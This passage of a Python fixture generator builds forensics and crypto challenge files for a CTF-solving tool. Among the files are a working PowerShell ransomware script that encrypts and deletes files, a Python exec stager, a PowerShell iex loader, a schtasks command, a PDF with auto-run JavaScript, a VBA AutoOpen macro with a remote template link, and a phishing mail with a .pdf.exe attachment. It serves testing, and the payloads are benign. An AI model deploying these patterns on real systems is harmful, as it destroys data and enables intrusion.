    "le drapeau sera CYBN{fixture_vigenere_fr} et la mission pourra commencer. "
)


def shift_letters(text: str, f) -> str:
    """Encrypt letter by letter: f(index 0..25) -> new index; case kept, the rest unchanged."""
    out = []
    for char in text:
        if "a" <= char <= "z":
            out.append(chr(ord("a") + f(ord(char) - ord("a")) % 26))
        elif "A" <= char <= "Z":
            out.append(chr(ord("A") + f(ord(char) - ord("A")) % 26))
        else:
            out.append(char)
    return "".join(out)


def vigenere_encrypt(text: str, key: str) -> str:
    """Vigenère forwards; the key advances on letters only."""
    out, used = [], 0
    for char in text:
        if char.isascii() and char.isalpha():
            base = ord("A") if char.isupper() else ord("a")
            shift = ord(key[used % len(key)].lower()) - ord("a")
            out.append(chr(base + (ord(char) - base + shift) % 26))
            used += 1
        else:
            out.append(char)
    return "".join(out)


def rail_fence_encrypt(text: str, rails: int) -> str:
    """Write the text in a zigzag over `rails` lines, read it line by line."""
    lines = [[] for _ in range(rails)]
    rail, step = 0, 1
    for char in text:
        lines[rail].append(char)
        if rail == 0:
            step = 1
        elif rail == rails - 1:
            step = -1
        rail += step
    return "".join("".join(line) for line in lines)


def write_classical_fixtures() -> None:
    message = (
        "Good work agent. The drop is moved to the north gate at midnight, come alone and "
        "bring the usual equipment. Burn this note after reading it. "
    )
    write(
        "classical_caesar.txt",
        shift_letters(message + "The flag is CYBN{fixture_caesar_large_shift}.", lambda x: x + 19)
        + "\n",
    )
    write(
        "classical_affine.txt",
        shift_letters(message + "The flag is CYBN{fixture_affine_cipher}.", lambda x: 7 * x + 10)
        + "\n",
    )
    write(
        "classical_atbash.txt",
        shift_letters(message + "The flag is CYBN{fixture_atbash}.", lambda x: 25 - x) + "\n",
    )
    write("classical_vigenere.txt", vigenere_encrypt(FRENCH, "forensique") + "\n")
    write(
        "classical_railfence.txt",
        rail_fence_encrypt(message + "The flag is CYBN{fixture_rail_fence}.", 4) + "\n",
    )
    # A flag alone, Vigenère with a 3-letter key: only the CYBN{ crib can solve it.
    write("classical_vigenere_flag.txt", vigenere_encrypt("CYBN{fixture_short_key}", "elf") + "\n")


def aes_sbox() -> list[int]:
    """The AES S-box from its definition: inverse in GF(2^8), then an affine map.

    The inverse is found by brute force here (ctfc computes it differently), so
    the fixture does not depend on ctfc's code being right.
    """

    def multiply(a: int, b: int) -> int:
        result = 0
        while b:
            if b & 1:
                result ^= a
            a = (a << 1) ^ (0x11B if a & 0x80 else 0)
            b >>= 1
        return result

    box = []
    for value in range(256):
        inverse_value = next((c for c in range(1, 256) if multiply(value, c) == 1), 0)
        x = inverse_value
        out = 0x63
        for shift in range(5):  # b ^ rotl1 ^ rotl2 ^ rotl3 ^ rotl4
            out ^= ((x << shift) | (x >> (8 - shift))) & 0xFF
        box.append(out)
    return box


def aes_key_schedule(key: bytes) -> bytes:
    """FIPS-197 key expansion: 176 / 208 / 240 bytes for a 16 / 24 / 32-byte key."""
    sbox = aes_sbox()
    nk = len(key) // 4
    rounds = nk + 6
    words = [list(key[4 * i : 4 * i + 4]) for i in range(nk)]
    rcon = 1
    for i in range(nk, 4 * (rounds + 1)):
        temp = list(words[i - 1])
        if i % nk == 0:
            temp = temp[1:] + temp[:1]
            temp = [sbox[b] for b in temp]
            temp[0] ^= rcon
            rcon = ((rcon << 1) ^ (0x11B if rcon & 0x80 else 0)) & 0xFF
        elif nk > 6 and i % nk == 4:
            temp = [sbox[b] for b in temp]
        words.append([a ^ b for a, b in zip(words[i - nk], temp, strict=True)])
    return bytes(b for word in words for b in word)


def fake_memory(size: int) -> bytearray:
    """Something that looks like a process dump: zeros, pointers, strings, random runs."""
    memory = bytearray()
    strings = [
        b"GET /index.html HTTP/1.1\r\n",
        b"libcrypto.so.3\x00",
        b"/tmp/.cache/x\x00",
        b"Mozilla/5.0 (X11; Linux x86_64)\x00",
        b"session_id=4f2a\x00",
    ]
    while len(memory) < size:
        kind = RNG.randrange(4)
        if kind == 0:
            memory += bytes(RNG.randrange(16, 200))
        elif kind == 1:
            for _ in range(RNG.randrange(2, 12)):
                memory += struct.pack("<Q", 0x00007F0000000000 + RNG.randrange(1 << 32))
        elif kind == 2:
            memory += RNG.choice(strings)
        else:
            memory += RNG.randbytes(RNG.randrange(8, 64))
    return memory[:size]


def write_keyhunt_fixtures() -> None:
    secret = b"Exfiltration report: 4 hosts compromised. The flag is CYBN{fixture_key_schedule}.\n"

    # 1. A memory dump holding an expanded AES-256 key (what aeskeyfind looks for)
    key = RNG.randbytes(32)
    memory = fake_memory(65536)
    offset = 0x5A30
    memory[offset : offset + 240] = aes_key_schedule(key)
    write("memdump_aes.bin", bytes(memory))
    iv = RNG.randbytes(16)
    write("memdump_aes_ct.bin", iv + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(secret, 16)))

    # 2. `strings` output: a hex key labelled in a config line, among hash decoys
    key = RNG.randbytes(32)
    lines = [
        "GCC: (Debian 12.2.0-14) 12.2.0",
        f"build_id={RNG.randbytes(32).hex()}",
        "connecting to c2 server...",
        f"sha256={hashlib.sha256(b'decoy').hexdigest()}",
        f"aes_key = {key.hex()}",
        f"token: {base64.b64encode(RNG.randbytes(32)).decode()}",
        "error: could not open /etc/shadow",
    ]
    write("strings_dump.txt", "\n".join(lines) + "\n")
    secret2 = b"Second stage URL: http://evil.example/stage2 - flag CYBN{fixture_strings_key}\n"
    write("strings_dump_ct.bin", AES.new(key, AES.MODE_ECB).encrypt(pad(secret2, 16)))

    # 3. A binary with an ASCII key right after the AES S-box (custom crypto code)
    ascii_key = b"Sup3rS3cr3tK3y!!"
    blob = bytearray(RNG.randbytes(4096))
    blob[0x400 : 0x400 + 16] = bytes(aes_sbox()[:16])
    blob[0x700 : 0x700 + 17] = ascii_key + b"\x00"
    write("binary_with_key.bin", bytes(blob))
    iv = RNG.randbytes(16)
    secret3 = b"config: beacon every 60s, flag CYBN{fixture_ascii_key}\n"
    write(
        "binary_with_key_ct.bin",
        iv + AES.new(ascii_key, AES.MODE_CBC, iv).encrypt(pad(secret3, 16)),
    )


# ---------------------------------------------------------------------------
# M8: shapes of the user's own past challenges (github.com/CreaTikaa/CTFs-Writeups),
# rebuilt with new keys and fake flags. The real flags are never copied here.
# ---------------------------------------------------------------------------


def random_text_key(length: int) -> str:
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return "".join(RNG.choice(alphabet) for _ in range(length))


def write_writeup_fixtures() -> None:
    # 1. "Cave Expedition" shape: a PowerShell ransomware rebuilt from event logs.
    #    Obfuscated names, two base64 keys decoded by a helper function, the file
    #    XORed with BOTH keys (64 and 24 bytes: one 192-byte keystream, too long to
    #    find statistically), then written as base64 text. The file is not in the
    #    script: only `ctfc lens --against` can solve it.
    key1, key2 = random_text_key(64), random_text_key(24)
    script = f"""$k34Vm = "{base64.b64encode(b"*.txt *.doc *.docx *.pdf").decode()}"
$a53Va = "{base64.b64encode(key1.encode()).decode()}"
$b64Vb = "{base64.b64encode(key2.encode()).decode()}"

function a12Vc {{
    param([string]$a34Vd)
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd))
}}

$c56Ve = a12Vc $a53Va
$d78Vf = a12Vc $b64Vb

function l34Vn {{
    param([byte[]]$m56Vo, [byte[]]$n78Vp, [byte[]]$o90Vq)
    $p12Vr = [byte[]]::new($m56Vo.Length)
    for ($x = 0; $x -lt $m56Vo.Length; $x++) {{
        $q34Vs = $n78Vp[$x % $n78Vp.Length]
        $r56Vt = $o90Vq[$x % $o90Vq.Length]
        $p12Vr[$x] = $m56Vo[$x] -bxor $q34Vs -bxor $r56Vt
    }}
    return $p12Vr
}}

function s78Vu {{
    param([byte[]]$t90Vv, [string]$u12Vw, [string]$v34Vx)
    $y90Va = [System.Text.Encoding]::UTF8.GetBytes($u12Vw)
    $z12Vb = [System.Text.Encoding]::UTF8.GetBytes($v34Vx)
    $a34Vc = l34Vn $t90Vv $y90Va $z12Vb
    return [Convert]::ToBase64String($a34Vc)
}}

foreach ($ext in (a12Vc $k34Vm).Split(" ")) {{
    Get-ChildItem -Path "dca01aq2/" -Recurse | Where-Object {{ $_.Extension -match "^\\.$ext$" }} |
        ForEach-Object {{
            $s90Vu = [IO.File]::ReadAllBytes($_.FullName)
            $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf
            [IO.File]::WriteAllText("$($_.FullName).secured", $t12Vv)
            Remove-Item $_.FullName -Force
        }}
}}
"""
    write("writeup_cave_ransom.ps1", script)
    pdf = (
        b"%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
        b"2 0 obj << /Type /Pages /Count 1 >> endobj\n"
        b"BT /F1 24 Tf (Treasure map: CYBN{fixture_two_xor_keys}) Tj ET\n%%EOF\n"
    )
    stream = bytes(b ^ ord(key1[i % 64]) ^ ord(key2[i % 24]) for i, b in enumerate(pdf))
    write("writeup_cave_map.pdf.secured", base64.b64encode(stream))

    # 2. "A new Hire" shape: a Python stager, base64 key, XORed + zlib payload, exec.
    key = b"CYBN{fixture_stager_key}"
    payload = b"print('stage two loaded')  # CYBN{fixture_new_hire}\n"
    blob = base64.b64encode(xor(zlib.compress(payload), key)).decode()
    client = (
        "import base64\n"
        "import zlib\n\n"
        f'key = base64.b64decode("{base64.b64encode(key).decode()}")\n\n'
        f'data = base64.b64decode("{blob}")\n'
        "meterpreter_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])\n\n"
        "exec(zlib.decompress(meterpreter_data))\n"
    )
    write("writeup_newhire_client.py", client)

    # 3. "Ghost in the Dark" shape: a PowerShell AES loader; the encrypted file is
    #    separate (recovered from a disk image with tsk_recover / fls).
    aes_key, aes_iv = RNG.randbytes(32), RNG.randbytes(16)
    loader = f"""$k = [Convert]::FromBase64String("{base64.b64encode(aes_key).decode()}")
$v = [Convert]::FromBase64String("{base64.b64encode(aes_iv).decode()}")
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Key = $k
$aes.IV = $v
$bytes = [IO.File]::ReadAllBytes("payload.enc")
$dec = $aes.CreateDecryptor().TransformFinalBlock($bytes, 0, $bytes.Length)
iex ([Text.Encoding]::UTF8.GetString($dec))
"""
    write("writeup_ghost_loader.ps1", loader)
    stage2 = b"Write-Host 'ransom note dropped'  # CYBN{fixture_ghost_loader}\n"
    write(
        "writeup_ghost_payload.enc", AES.new(aes_key, AES.MODE_CBC, aes_iv).encrypt(pad(stage2, 16))
    )

    # 4. "Silent Trap" shape: C2 commands in mails, RC4 then base64.
    rc4_key = RNG.randbytes(16)
    command = b"schtasks /create /tn Synchronization /tr calc.exe  & echo CYBN{fixture_rc4_mail}"
    write("writeup_silent_rc4.b64", base64.b64encode(rc4(rc4_key, command)) + b"\n")
    write("writeup_silent_rc4.key", rc4_key.hex() + "\n")


def rc4(key: bytes, data: bytes) -> bytes:
    """RC4, written here so the fixture does not depend on ctfc or pycryptodome."""
    state = list(range(256))
    j = 0
    for i in range(256):
        j = (j + state[i] + key[i % len(key)]) % 256
        state[i], state[j] = state[j], state[i]
    i = j = 0
    out = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + state[i]) % 256
        state[i], state[j] = state[j], state[i]
        out.append(byte ^ state[(state[i] + state[j]) % 256])
    return bytes(out)


# ---------------------------------------------------------------------------
# Audit (after M8): shapes from the user's own challenge notes (Notion exports).
# Hand-written formats, so `make fixtures` needs no external tool and stays
# deterministic; each one was checked against the real tool once (7z t, openssl).
# ---------------------------------------------------------------------------


def seven_zip_stored(name: str, content: bytes) -> bytes:
    """A real 7z archive with one file stored as is (Copy codec), written by hand.

    Checked with `7z t` / `7z x`. Sizes stay below 128 so every 7z number is one byte.
    """
    utf16 = name.encode("utf-16-le") + b"\x00\x00"
    header = (
        bytes(
            [
                0x01,  # kHeader
                0x04,  # kMainStreamsInfo
                0x06,
                0x00,
                0x01,  # kPackInfo: pack position 0, one pack stream
                0x09,
                len(content),
                0x00,  # kSize, kEnd
                0x07,
                0x0B,
                0x01,
                0x00,  # kUnPackInfo, kFolder, 1 folder, not external
                0x01,
                0x01,
                0x00,  # 1 coder: id size 1, codec 0x00 = Copy
                0x0C,
                len(content),
                0x00,  # kCodersUnPackSize, kEnd
                0x00,  # kEnd of MainStreamsInfo
                0x05,
                0x01,  # kFilesInfo, 1 file
                0x11,
                1 + len(utf16),
                0x00,  # kName, property size, not external
            ]
        )
        + utf16
        + bytes([0x00, 0x00])
    )
    next_header = (
        len(content).to_bytes(8, "little")
        + len(header).to_bytes(8, "little")
        + zlib.crc32(header).to_bytes(4, "little")
    )
    start = b"7z\xbc\xaf'\x1c\x00\x04" + zlib.crc32(next_header).to_bytes(4, "little")
    return start + next_header + content + header


def png_chunk(kind: bytes, body: bytes) -> bytes:
    return len(body).to_bytes(4, "big") + kind + body + zlib.crc32(kind + body).to_bytes(4, "big")


def gray_png(text: bytes = b"") -> bytes:
    """A 1x1 gray PNG (the decoy), optionally with a tEXt chunk."""
    head = (1).to_bytes(4, "big") + (1).to_bytes(4, "big") + bytes([8, 0, 0, 0, 0])
    body = png_chunk(b"IHDR", head) + png_chunk(b"IDAT", zlib.compress(b"\x00\x80"))
    if text:
        body += png_chunk(b"tEXt", b"Comment\x00" + text)
    return b"\x89PNG\r\n\x1a\n" + body + png_chunk(b"IEND", b"")


def png_with_chunks(
    width: int, height: int, pixels: bytes, extra: list[tuple[bytes, bytes]] | None = None
) -> bytes:
    """A real 8-bit RGB PNG from raw pixels, with optional extra chunks.

    Each scanline is prefixed with filter type 0 (none), which is what makes the
    bytes come back out of the decoder exactly as they went in - the point when
    the fixture is meant to carry a bit-exact LSB message.
    """
    raw = bytearray()
    stride = width * 3
    for row in range(height):
        raw += b"\x00" + pixels[row * stride : (row + 1) * stride]
    head = width.to_bytes(4, "big") + height.to_bytes(4, "big") + bytes([8, 2, 0, 0, 0])
    body = png_chunk(b"IHDR", head)
    for kind, payload in extra or []:
        body += png_chunk(kind, payload)
    body += png_chunk(b"IDAT", zlib.compress(bytes(raw)))
    return b"\x89PNG\r\n\x1a\n" + body + png_chunk(b"IEND", b"")


def dns_query_name(name: str) -> bytes:
    """A DNS question for `name` (type A, class IN)."""
    body = b"".join(bytes([len(label)]) + label.encode() for label in name.split("."))
    return struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + body + b"\x00\x00\x01\x00\x01"


def openssl_enc_pbkdf2(password: bytes, plaintext: bytes, iterations: int) -> bytes:
    """`openssl enc -aes-256-cbc -pbkdf2 -iter N` written by hand (checked with openssl)."""
    salt = RNG.randbytes(8)
    derived = hashlib.pbkdf2_hmac("sha256", password, salt, iterations, 48)
    key, iv = derived[:32], derived[32:]
    return b"Salted__" + salt + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext, 16))


def write_audit_fixtures() -> None:
    # 1. "Pixel Rehab": PNG with byte 0 = 0x88, a 7z appended after IEND, and the
    #    first 6 bytes of a PNG signature pasted over the 7z magic.
    hidden = seven_zip_stored("real_flag.txt", b"CYBN{fixture_pixel_rehab}\n")
    broken = bytearray(gray_png() + b"\x89PNG\r\n" + hidden[6:])
    broken[0] = 0x88
    write("audit_pixel_rehab.fun", bytes(broken))

    # 2. DNS tunnelling: hex payload over SEVERAL labels per query, a counter label
    #    in front, junk before the PNG magic in the stream.
    stream = "ff00ff" + gray_png(b"CYBN{fixture_dns_tunnel}").hex()
    frames = []
    for number, start in enumerate(range(0, len(stream), 48)):
        piece = stream[start : start + 48]
        labels = [f"s{number:03d}x"] + [piece[i : i + 24] for i in range(0, len(piece), 24)]
        name = ".".join(labels) + ".jz-n-bs.local"
        frames.append(
            pcap_packet(
                ethernet_ipv4(
                    "10.0.0.5", "10.0.0.53", 17, udp_datagram(50000, 53, dns_query_name(name))
                ),
                1700000000 + number,
            )
        )
    write(
        "audit_dns_tunnel.pcap",
        struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1) + b"".join(frames),
    )

    # 3. pfSense backup: base64 of the XML config, the RADIUS secret hidden by ROT13.
    rot13 = str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm",
    )
    config = (
        '<?xml version="1.0"?>\n<pfsense>\n  <system><hostname>gateway</hostname></system>\n'
        "  <radius>\n    <!-- rotation policy applied to the shared secret -->\n"
        f"    <secret>{'L3g4cyOne!sn3o'.translate(rot13)}</secret>\n"
        "    <server>10.0.0.10</server>\n  </radius>\n</pfsense>\n"
    )
    write("audit_pfsense_gateway.bak", base64.b64encode(config.encode()) + b"\n")

    # 4. Docker layers: `openssl enc -aes-256-cbc -iter 10 -pass pass:<sha256 hex>`.
    password = hashlib.sha256(b"fixture docker layer").hexdigest()
    write("audit_docker_pass.txt", password + "\n")
    write(
        "audit_docker_flag.enc",
        openssl_enc_pbkdf2(password.encode(), b"CYBN{fixture_iter10}\n", 10),
    )

    # 6. Android ransomware shape: AES-CBC, key = SHA-256(hardcoded password), IV = zeros.
    key = hashlib.sha256(b"fixture_locker_pw").digest()
    document = b"Private document. The flag is CYBN{fixture_zero_iv}.\n"
    write("audit_android_doc.enc", AES.new(key, AES.MODE_CBC, bytes(16)).encrypt(pad(document, 16)))

    # 7. LUKS + RAM dump (the aeskeyfind case). real_luks1_header.bin and
    #    real_luks2_header.bin are STATIC fixtures: the first 4096 / 16384 bytes
    #    (metadata only, no keyslot material) of volumes made once with
    #      cryptsetup luksFormat --type luks1|luks2 --cipher aes-xts-plain64
    #        --key-size 512 --hash sha256 --volume-key-file mk.bin
    #    and real_luks_master_key.hex is that mk.bin. The dump below holds the two
    #    AES-256 halves as key schedules, in the OPPOSITE order of the master key.
    master = bytes.fromhex((FIXTURES / "real_luks_master_key.hex").read_text().strip())
    memory = bytearray(RNG.randbytes(65536))
    memory[0x2400 : 0x2400 + 240] = aes_key_schedule(master[32:])
    memory[0x7C00 : 0x7C00 + 240] = aes_key_schedule(master[:32])
    write("audit_luks_mem.raw", bytes(memory))

    # 5. secretsdump.py output: two real accounts, a disabled one with the empty hash.
    write(
        "audit_secretsdump.txt",
        "Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::\n"
        "DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n"
        "samwiseg:1013:aad3b435b51404eeaad3b435b51404ee:dcd99365563e67eb8fbe8c9d83b0ca6c:::\n",
    )

    # 6. ZipCrypto archive holding a PNG: the known-plaintext case for bkcrack.
    #    The entry is deflate-stored, so the PNG magic is five bytes into the
    #    ciphertext - which is exactly what ctfc works out for the bkcrack command.
    png = gray_png()
    write("audit_zipcrypto.zip", zipcrypto_zip("flag.png", png, b"s3cr3t"))

    # 7. RADIUS Access-Request: the PAP password is hidden under a weak shared
    #    secret ("testing123"), the kind ctfc guesses, so the capture alone leaks it.
    authenticator = RNG.randbytes(16)
    hidden = radius_hide_password(b"CYBN{fixture_radius_pap}", authenticator, b"testing123")
    request = (
        bytes([1, 37])  # code = Access-Request, identifier 37
        + struct.pack(">H", 20 + 2 + 5 + 2 + len(hidden))  # total length
        + authenticator
        + bytes([1, 2 + 5])
        + b"alice"  # User-Name = "alice"
        + bytes([2, 2 + len(hidden)])
        + hidden  # User-Password (encrypted)
    )
    frame = ethernet_ipv4("10.0.0.5", "10.0.0.1", 17, udp_datagram(51000, 1812, request))
    header = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
    write("audit_radius.pcap", header + pcap_packet(frame, 1700000500))

    # 16. A protobuf message with no .proto: a varint, a string holding the flag,
    #     a nested message and a fixed32 - decodable from the wire format alone.
    def pb_varint(number: int) -> bytes:
        out = bytearray()
        while True:
            seven = number & 0x7F
            number >>= 7
            out.append(seven | 0x80 if number else seven)
            if not number:
                return bytes(out)

    def pb_tag(field_number: int, wire_type: int) -> bytes:
        return pb_varint((field_number << 3) | wire_type)

    pb_flag = b"CYBN{fixture_protobuf}"
    pb_inner = pb_tag(1, 0) + pb_varint(2024) + pb_tag(2, 0) + pb_varint(7)
    write(
        "audit_message.pb",
        pb_tag(1, 0)
        + pb_varint(42)
        + pb_tag(2, 2)
        + pb_varint(len(pb_flag))
        + pb_flag
        + pb_tag(3, 2)
        + pb_varint(len(pb_inner))
        + pb_inner
        + pb_tag(4, 5)
        + (1234).to_bytes(4, "little"),
    )

    # 15. A Windows event log with real chunk and record framing: a logon, a
    #     PowerShell -EncodedCommand carrying the flag, and a service that logged
    #     a password. Written from the format description, not by Windows.
    def evtx_record(number: int, timestamp: int, strings: list[str]) -> bytes:
        body = b"".join(text.encode("utf-16-le") + b"\x00\x00" for text in strings)
        size = 24 + len(body) + 4  # header, body, and the trailing size
        return (
            b"\x2a\x2a\x00\x00"
            + struct.pack("<I", size)
            + struct.pack("<Q", number)
            + struct.pack("<Q", timestamp)
            + body
            + struct.pack("<I", size)
        )

    evtx_script = "Write-Host 'CYBN{fixture_evtx_record}'"
    evtx_encoded = base64.b64encode(evtx_script.encode("utf-16-le")).decode()
    base_time = 133476575820000000  # a FILETIME in December 2023
    evtx_records = b"".join(
        [
            evtx_record(
                1,
                base_time,
                ["Microsoft-Windows-Security-Auditing", "alice", "C:\\Windows\\System32\\cmd.exe"],
            ),
            evtx_record(
                2,
                base_time + 10_000_000,
                ["Microsoft-Windows-PowerShell", f"powershell.exe -NoProfile -enc {evtx_encoded}"],
            ),
            evtx_record(
                3, base_time + 20_000_000, ["Service Control Manager", "db_password = sup3rs3cret"]
            ),
        ]
    )
    evtx_chunk = bytearray(65536)
    evtx_chunk[0:8] = b"ElfChnk\x00"
    evtx_chunk[512 : 512 + len(evtx_records)] = evtx_records
    evtx_header = bytearray(4096)
    evtx_header[0:8] = b"ElfFile\x00"
    evtx_header[24:32] = struct.pack("<Q", 4)  # the next record number
    evtx_header[42:44] = struct.pack("<H", 1)  # one chunk
    write("audit_security.evtx", bytes(evtx_header) + bytes(evtx_chunk))

    # 14. A SQLite database with deleted rows still recoverable. `secure_delete`
    #     is OFF, as it is in a browser's or a phone app's database - which is
    #     what a challenge hands you. Note that Debian's own SQLite defaults it
    #     ON, so a database made without this pragma really is wiped.
    db_path = FIXTURES / "audit_notes.sqlite"
    db_path.unlink(missing_ok=True)
    connection = sqlite3.connect(db_path)
    connection.execute("PRAGMA secure_delete=OFF")
    connection.execute("CREATE TABLE notes (id INTEGER PRIMARY KEY, title TEXT, body TEXT)")
    connection.executemany(
        "INSERT INTO notes (title, body) VALUES (?, ?)",
        [
            (f"note {index}", f"ordinary note number {index}, nothing special")
            for index in range(1, 80)
        ],
    )
    connection.executemany(
        "INSERT INTO notes (title, body) VALUES (?, ?)",
        [
            ("the flag", "CYBN{fixture_sqlite_deleted}"),
            ("credentials", "admin_password = hunter2hunter2"),
        ],
    )
    connection.commit()
    # Delete enough to release whole pages onto the freelist.
    connection.execute("DELETE FROM notes WHERE title IN ('the flag', 'credentials')")
    connection.execute("DELETE FROM notes WHERE id < 50")
    connection.commit()
    connection.close()
    print(f"  {'audit_notes.sqlite':32} {db_path.stat().st_size} bytes")

    # 13. LSB steganography: the flag is written one bit per red sample, in the
    #     usual row-major / MSB-first way, and a tEXt comment acts as the decoy.
    lsb_width, lsb_height = 64, 24
    secret = b"CYBN{fixture_lsb_red}\x00"
    bits = [(byte >> (7 - position)) & 1 for byte in secret for position in range(8)]
    pixels = bytearray()
    index = 0
    for y in range(lsb_height):
        for x in range(lsb_width):
            # A gentle gradient, so the image looks like something.
            red, green, blue = (x * 4) % 256, (y * 10) % 256, 128
            if index < len(bits):
                red = (red & 0xFE) | bits[index]
                index += 1
            pixels += bytes([red, green, blue])
    write(
        "audit_lsb.png",
        png_with_chunks(
            lsb_width,
            lsb_height,
            bytes(pixels),
            [(b"tEXt", b"Comment\x00nothing to see here, move along")],
        ),
    )

    # 12. A PDF built like a malicious one: /OpenAction fires JavaScript that
    #     rebuilds the flag from character codes, an embedded file carries a
    #     second one, and an incremental update "hides" a third - the first
    #     revision still holds it, which is the classic redaction failure.
    def pdf_object(number: int, body: bytes) -> bytes:
        return b"%d 0 obj\n" % number + body + b"\nendobj\n"

    flag_js = "CYBN{fixture_pdf_js}"
    codes = ", ".join(str(ord(char)) for char in flag_js)
    javascript = (
        f"var a = [{codes}];\n"
        "var s = '';\n"
        "for (var i = 0; i < a.length; i++) {{ s += String.fromCharCode(a[i]); }}\n"
        "app.alert(s);\n"
    ).format()
    embedded_payload = b"CYBN{fixture_pdf_embedded}\n"
    compressed = zlib.compress(embedded_payload)

    body = b"%PDF-1.7\n"
    body += pdf_object(1, b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>")
    body += pdf_object(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    body += pdf_object(3, b"<< /Type /Page /Parent 2 0 R /Contents 4 0 R >>")
    secret_text = b"BT (CYBN{fixture_pdf_revision}) Tj ET"
    stream4 = zlib.compress(secret_text)
    body += pdf_object(
        4,
        b"<< /Length %d /Filter /FlateDecode >>\nstream\n" % len(stream4)
        + stream4
        + b"\nendstream",
    )
    body += pdf_object(5, b"<< /Type /Action /S /JavaScript /JS (" + javascript.encode() + b") >>")
    body += pdf_object(
        6,
        b"<< /Type /EmbeddedFile /Subtype /text#2Fplain /Length %d /Filter /FlateDecode >>\n"
        b"stream\n" % len(compressed) + compressed + b"\nendstream",
    )
    body += pdf_object(7, b"<< /Type /Filespec /F (payload.txt) /EF << /F 6 0 R >> >>")
    body += b"trailer\n<< /Root 1 0 R /Size 8 >>\n%%EOF\n"

    # The incremental update: object 4 is replaced by an empty page, so a viewer
    # shows nothing - but the original object 4 above is still in the file.
    blank = zlib.compress(b"BT () Tj ET")
    body += pdf_object(
        4, b"<< /Length %d /Filter /FlateDecode >>\nstream\n" % len(blank) + blank + b"\nendstream"
    )
    body += b"trailer\n<< /Root 1 0 R /Size 8 /Prev 0 >>\n%%EOF\n"
    write("audit_malicious.pdf", body)

    # 11. A macro-enabled Office document, the phishing-attachment shape: the
    #     VBA runs on open, XORs a blob with a one-letter key and shows the flag.
    #     The module stream gets a padded "performance cache" in front of the
    #     compressed container, exactly like a real one.
    macro = (
        'Attribute VB_Name = "Module1"\r\n'
        "Sub AutoOpen()\r\n"
        "    Dim blob As String\r\n"
        "    Dim key As String\r\n"
        '    key = "K"\r\n'
        f'    blob = "{bytes(b ^ ord("K") for b in b"CYBN{fixture_vba_macro}").hex()}"\r\n'
        "    Dim i As Integer\r\n"
        "    Dim out As String\r\n"
        "    For i = 1 To Len(blob) Step 2\r\n"
        '        out = out & Chr(CLng("&H" & Mid(blob, i, 2)) Xor Asc(key))\r\n'
        "    Next i\r\n"
        "    MsgBox out\r\n"
        "End Sub\r\n"
    ).encode("latin-1")
    container = ovba_compress(macro)
    # Real module streams carry a performance cache first; pad past the 4096-byte
    # mini-stream cutoff so the fixture uses a normal sector chain.
    cache = bytes(RNG.randrange(1, 256) for _ in range(4200))
    module_stream = cache + container
    ole = cfb_write([("Module1", module_stream), ("dir", b"\x00" * 4096)])
    write("audit_macro.doc", ole)

    # The same project inside a .docm (a ZIP), plus a remote-template relationship.
    docm = io.BytesIO()
    with zipfile.ZipFile(docm, "w", zipfile.ZIP_DEFLATED) as archive:

        def add(name: str, payload: bytes) -> None:
            info = zipfile.ZipInfo(name, date_time=(2026, 1, 1, 0, 0, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            archive.writestr(info, payload)

        add("[Content_Types].xml", b'<?xml version="1.0"?><Types/>')
        add("word/document.xml", b'<?xml version="1.0"?><w:document/>')
        add("word/vbaProject.bin", ole)
        add(
            "word/_rels/settings.xml.rels",
            b'<?xml version="1.0"?><Relationships>'
            b'<Relationship Id="rId1" Target="http://eldoria.invalid/template.dotm"'
            b' TargetMode="External"/></Relationships>',
        )
    write("audit_macro.docm", docm.getvalue())

    # 10. A Windows event log holding the dropper's command line, the "Cave
    #     Expedition" first step: .evtx stores its strings as UTF-16LE, so the
    #     -EncodedCommand is invisible to a plain ASCII strings pass.
    script = (
        "$k='CYBN';$b=[Convert]::FromBase64String('"
        + base64.b64encode(b"CYBN{fixture_evtx_dropper}").decode()
        + "');[Text.Encoding]::UTF8.GetString($b)"
    )
    encoded = base64.b64encode(script.encode("utf-16-le")).decode()
    command = f"powershell.exe -NoProfile -W Hidden -enc {encoded}"
    noise = bytes(RNG.randrange(256) for _ in range(600))
    log = (
        b"ElfFile\x00"
        + noise[:300]
        + b"ElfChnk\x00"
        + command.encode("utf-16-le")  # the record string, as Windows writes it
        + noise[300:]
    )
    write("audit_evtx_dropper.evtx", log)

    # 9. IMAP traffic carrying a phishing mail: the HTML body gives the password
    #    of the attached ZIP, which holds a double-extension payload. The flag is
    #    in the body, so `ctfc pcap` alone is enough to read it.
    payload_zip = io.BytesIO()
    with zipfile.ZipFile(payload_zip, "w", zipfile.ZIP_DEFLATED) as archive:
        # An explicit date: writestr() would otherwise stamp the entry with the
        # current time, and this fixture has to come out byte-identical every run.
        entry = zipfile.ZipInfo("Balance_Report.pdf.exe", date_time=(2026, 1, 1, 0, 0, 0))
        entry.compress_type = zipfile.ZIP_DEFLATED
        archive.writestr(entry, b"MZ" + b"\x90" * 60 + b"payload")
    attachment = base64.b64encode(payload_zip.getvalue()).decode()
    body_html = (
        "<html><body><p>Hello,</p><p>The report is attached. The archive password "
        "is <b>eldoriaismylife</b>.</p><p>CYBN{fixture_mail_imap}</p></body></html>"
    )
    message = (
        "Return-Path: <attacker@eldoria.invalid>\r\n"
